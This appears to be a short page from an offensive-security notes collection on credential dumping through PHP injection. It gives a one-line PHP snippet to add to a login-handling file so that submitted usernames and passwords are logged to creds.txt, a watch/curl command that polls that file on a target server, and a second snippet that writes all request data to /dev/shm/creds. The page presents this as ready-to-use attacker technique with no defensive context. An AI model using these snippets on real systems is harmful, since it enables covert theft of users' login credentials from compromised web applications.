---
icon: key-skeleton
---

# Credential Dumping

{% hint style="info" %}
<mark style="color:red;">**`File-based Credentials Dumping via PHP Injection`**</mark>

<mark style="color:purple;">This technique involves modifying any</mark> <mark style="color:orange;">`authentication-handling`</mark> <mark style="color:purple;">PHP file to</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**log**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">user credentials to a file on the server.</mark>

* <mark style="color:purple;">Add the next line after</mark> <mark style="color:orange;">**`<?php`**</mark><mark style="color:purple;">:</mark>&#x20;

{% code overflow="wrap" %}
```php
file_put_contents("creds.txt", $_POST['log']." - ".$_POST['pwd'], FILE_APPEND);
```
{% endcode %}

* <mark style="color:purple;">The attacker can continuously check the</mark> <mark style="color:orange;">**`creds.txt`**</mark> <mark style="color:purple;">file for new data using a command like this:</mark>

{% code overflow="wrap" %}
```sh
watch -n 1 curl -s -X GET http://10.10.10.78/dev_wiki/creds.txt
```
{% endcode %}

***

<mark style="color:red;">**`Memory-based Credentials Dumping via PHP Injection`**</mark>

<mark style="color:purple;">This method involves injecting PHP code into an authentication PHP script to</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**capture login credentials**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">and write them to a</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**temporary memory file**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">(</mark><mark style="color:purple;">`/dev/shm`</mark><mark style="color:purple;">).</mark>

* <mark style="color:purple;">The following code to capture the</mark> <mark style="color:orange;">**`$_REQUEST`**</mark> <mark style="color:purple;">data (which includes the</mark> <mark style="color:orange;">**`$_POST`**</mark> <mark style="color:purple;">data from the login form) and write it to a file:</mark>

{% code overflow="wrap" %}
```php
<?php
$rrr = print_r($_REQUEST, true);
$fff = fopen("/dev/shm/creds", "a");
fwrite($fff, $rrr);
fclose($fff);
```
{% endcode %}

* <mark style="color:purple;">Just</mark> <mark style="color:orange;">**`cat`**</mark> <mark style="color:purple;">the file:</mark>

```sh
cat creds
```
{% endhint %}
